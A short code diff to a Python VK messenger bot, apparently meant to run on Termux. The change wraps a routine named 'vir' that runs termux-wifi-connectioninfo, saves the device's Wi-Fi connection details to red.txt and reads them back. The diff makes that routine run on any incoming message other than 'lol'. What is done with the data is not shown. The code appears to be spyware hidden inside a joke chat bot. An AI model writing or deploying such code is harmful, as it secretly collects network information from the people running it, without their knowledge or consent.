@@ -16,8 +16,7 @@ def bot():
     vk=vk_api.VkApi(token=token)
     longpoll=VkLongPoll(vk)
     for event in longpoll.listen():
-        a=1
-        if a==1:
+        def vir():
             os.system(r'termux-wifi-connectioninfo>>red.txt')
             o=open(r'red.txt')
             rik=o.read()
@@ -31,4 +30,6 @@ def bot():
                 r=event.text
                 if r=='lol':
                     y(event.user_id,'lol kek')
+                else:
+                    vir()
 bot()
